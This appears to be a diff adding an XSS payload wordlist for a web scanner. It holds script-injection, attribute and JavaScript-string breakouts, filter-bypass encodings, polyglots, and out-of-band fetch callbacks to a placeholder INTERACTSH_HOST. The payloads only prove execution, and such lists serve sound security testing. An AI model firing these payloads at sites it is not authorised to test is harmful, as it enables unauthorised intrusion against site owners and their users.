@@ -1,0 +1,128 @@
+# ─── Basic script injection ───────────────────────────────────────────────────
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+
+# ─── DOM mutation probes (sets window.__xss for silent detection) ──────────────
+<img src=x onerror="window.__xss=true">
+<svg onload="window.__xss=true">
+<body onload="window.__xss=true">
+<iframe onload="window.__xss=true" src="about:blank"></iframe>
+<details open ontoggle="window.__xss=true">
+<input autofocus onfocus="window.__xss=true">
+<video src=x onerror="window.__xss=true">
+<audio src=x onerror="window.__xss=true">
+
+# ─── Alert via event handlers ─────────────────────────────────────────────────
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<object data="javascript:alert(1)">
+
+# ─── Attribute-context breakouts ─────────────────────────────────────────────
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><img src=x onerror="window.__xss=true">
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onload="alert(1)
+"><details open ontoggle=alert(1)>
+" onclick="alert(document.domain)
+# slash instead of space to bypass space filters (e.g. value=" injected)
+"autofocus/onfocus="alert(document.domain)
+'autofocus/onfocus='alert(document.domain)
+# confirm as alert alternative when alert keyword is filtered
+"autofocus/onfocus="confirm`document.domain`
+
+# ─── JavaScript string context breakouts ──────────────────────────────────────
+# Single-quote string context
+';alert(document.domain);
+';window.__xss=true;//
+\';alert(document.domain);<!--
+\';alert(document.domain);//
+'};alert(document.domain);//
+');alert(document.domain);//
+# Double-quote string context
+";alert(document.domain);
+";window.__xss=true;//
+"};alert(document.domain);//
+");alert(document.domain);//
+# Object/block terminator variants
+"};alert(document.domain);{//
+'};alert(document.domain);{//
+
+# ─── alert() keyword filter bypasses ─────────────────────────────────────────
+"};this[17795081..toString(36)](document.domain);//
+'};this[17795081..toString(36)](document.domain);//
+';confirm(document.domain);//
+';prompt(document.domain);//
+");function log_access(url){setTimeout('alert(document.domain)',0)}//
+
+# ─── JavaScript protocol ──────────────────────────────────────────────────────
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:window.__xss=true
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==%23
+data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==#
+data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==//
+data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==
+
+# ─── Template / expression contexts ──────────────────────────────────────────
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+#{alert(1)}
+<%-alert(1)%>
+<%= alert(1) %>
+
+# ─── Filter-bypass variants ───────────────────────────────────────────────────
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<svg><script>alert&#40;1&#41;</script>
+<a href="&#106;avascript:alert(1)">click</a>
+<a href="java&#0;script:alert(1)">click</a>
+<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)">
+<script>\u0061lert(1)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>Function('alert(1)')()</script>
+
+# ─── Tag/attribute mutation ───────────────────────────────────────────────────
+<<script>alert(1)//<</script>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+--></script><script>alert(1)</script>
+
+# ─── CSS-based (legacy browsers) ─────────────────────────────────────────────
+<style>*{background:url("javascript:alert(1)")}</style>
+<link rel="stylesheet" href="javascript:alert(1)">
+
+# ─── Polyglots ───────────────────────────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+">'><img src=x onerror=alert(1)><svg onload=alert(1)><script>alert(1)</script>
+</p></textarea></script><svg onload=alert(1)>
+</script><svg onload="window.__xss=true">
+</textarea><img src=x onerror="window.__xss=true">
+</title></style></script><img src=x onerror=alert(1)>
+
+# ─── OOB / interactsh callbacks (require JS execution to fire) ────────────────
+<script>fetch("//INTERACTSH_HOST")</script>
+<img src=x onerror="fetch('//INTERACTSH_HOST')">
+<svg onload="fetch('//INTERACTSH_HOST')">
+"><script>fetch("//INTERACTSH_HOST")</script>
+'><script>fetch("//INTERACTSH_HOST")</script>
+"><img src=x onerror="fetch('//INTERACTSH_HOST')">
+';fetch("//INTERACTSH_HOST");//
+</script><script>fetch("//INTERACTSH_HOST")</script>
+</textarea><script>fetch("//INTERACTSH_HOST")</script>
